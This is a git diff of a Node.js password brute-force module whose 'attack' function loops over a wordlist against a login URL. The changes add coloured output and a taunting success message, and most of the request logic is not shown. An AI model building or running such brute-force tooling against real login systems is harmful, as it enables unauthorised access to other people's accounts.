@@ -1,6 +1,7 @@
 const axios = require('axios')
 const wait = require('waait')
 const player = require('play-sound')((opts = {}))
+const chalk = require('chalk')
 
 const TIMEOUT = 20
 
@@ -28,7 +29,7 @@ const asyncForEach = async (array, callback) => {
 }
 
 const attack = async (url, username, wordlist) => {
-  console.log('\n[i] Starting brute-force attack')
+  console.log(chalk.yellow('\n[i] Starting brute-force attack'))
 
   // Transform wordlist buffer to Array
   const passwords = wordlist.toString().split('\n')
@@ -47,11 +48,14 @@ const attack = async (url, username, wordlist) => {
       player.play('success.mp3', function(err) {
         if (err) throw err
       })
-      console.log(`\n[✓] Password found for ${username}: ${password}`)
+      console.log(
+        chalk.green(`\n[✓] Password found for ${username}: ${password}`)
+      )
+      console.log('💀 D3str0y th1s n00b!')
       process.exit(0)
     }
   })
-  console.log(`[✘] No password found for user ${username}`)
+  console.log(chalk.red(`[✘] No password found for user ${username}`))
 }
 
 module.exports = attack
